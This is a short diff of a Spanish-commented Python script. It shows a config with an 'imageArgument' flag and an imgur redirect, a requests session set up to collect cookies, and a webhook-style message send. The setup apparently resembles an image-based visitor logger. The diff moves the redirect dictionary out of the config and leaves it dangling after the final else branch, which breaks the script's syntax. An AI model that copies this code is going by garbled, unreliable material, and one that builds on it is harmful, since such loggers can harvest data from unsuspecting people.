@@ -17,11 +17,6 @@ config = {
      "imageArgument": True,
 },
 
-    "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://i.imgur.com/UTwSor8.jpeg" # Link to the webpage to redirect to 
-    },
-
 # Crear una sesión de requests para obtener cookies
 session = requests.Session()
 
@@ -60,3 +55,10 @@ if response.status_code == 204:
     print("Mensaje enviado exitosamente.")
 else:
     print(f"Error al enviar el mensaje. Código de estado: {response.status_code}")
+
+
+    "redirect": {
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://i.imgur.com/UTwSor8.jpeg" # Link to the webpage to redirect to 
+    },
+
